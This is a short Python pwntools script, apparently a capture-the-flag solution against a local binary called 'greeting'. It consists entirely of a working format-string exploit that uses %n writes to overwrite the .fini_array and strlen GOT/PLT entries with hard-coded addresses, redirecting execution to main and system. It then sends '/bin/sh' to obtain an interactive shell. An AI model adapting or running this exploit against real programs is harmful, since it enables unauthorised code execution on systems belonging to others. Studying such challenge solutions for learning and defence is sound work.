from pwn import *

p = process('./greeting')
strlen_plt = 0x8049a54
system_call = 0x8048490
libc_start_main_plt = 0x8049a5c
fini_array = 0x8049934
main = 0x80485ed

exploit = ''
exploit += 'AA'
exploit += p32(fini_array)
exploit += p32(fini_array+2)
exploit += p32(strlen_plt)
exploit += p32(strlen_plt+2)
exploit += '%34249u'
exploit += '%12$n'
exploit += '%33303u'
exploit += '%13$n'
exploit += '%134446220u'
exploit += '%14$n'

# exploit += '%31884u'
# exploit += '%14$n'
# exploit += '%33652u'
# exploit += '%15$n'

p.sendline(exploit)
l = p.recvuntil(':)')
p.sendline('/bin/sh')

p.interactive()